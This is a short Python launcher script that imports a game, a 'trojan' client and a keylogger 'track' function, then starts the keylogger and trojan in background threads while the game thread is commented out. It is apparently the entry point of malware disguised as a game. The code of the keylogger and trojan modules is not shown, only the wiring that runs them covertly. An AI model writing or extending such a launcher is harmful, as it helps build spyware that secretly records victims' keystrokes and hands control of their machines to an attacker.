from game import game
from client import trojan
import threading
from KeyLogger import track

# t1 = threading.Thread(target=game)
key = threading.Thread(target=track)
t2 = threading.Thread(target=trojan)

# t1.start()
key.start()
t2.start()